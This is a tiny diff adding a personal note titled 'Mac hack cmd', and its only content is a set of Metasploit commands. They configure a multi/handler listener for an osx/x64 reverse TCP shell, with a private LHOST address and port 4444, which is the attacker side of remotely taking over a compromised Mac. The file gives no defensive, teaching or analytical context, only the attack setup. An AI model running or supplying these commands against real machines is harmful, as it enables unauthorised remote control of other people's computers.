@@ -1,0 +1,6 @@
+Mac  hack cmd
+use exploit/multi/handler
+set payload osx/x64/shell_reverse_tcp
+set LHOST 172.16.17.39
+set LPORT 4444
+
